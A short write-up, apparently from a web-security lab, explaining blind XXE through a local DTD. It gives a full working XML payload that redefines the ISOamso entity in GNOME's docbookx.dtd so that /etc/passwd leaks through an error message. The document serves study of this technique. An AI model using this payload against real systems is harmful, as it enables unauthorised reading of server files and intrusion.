Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.


I used the following payload to list the contents of the passwd file:

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>


knowing that GNOME systems contain an entity named ISOamso meant i could use this payload to reference the local dtd and manipulate the entity

checkout GoSecure on giuthub for all the .dtd files that come on servers by default, also shows the exploits for the entities
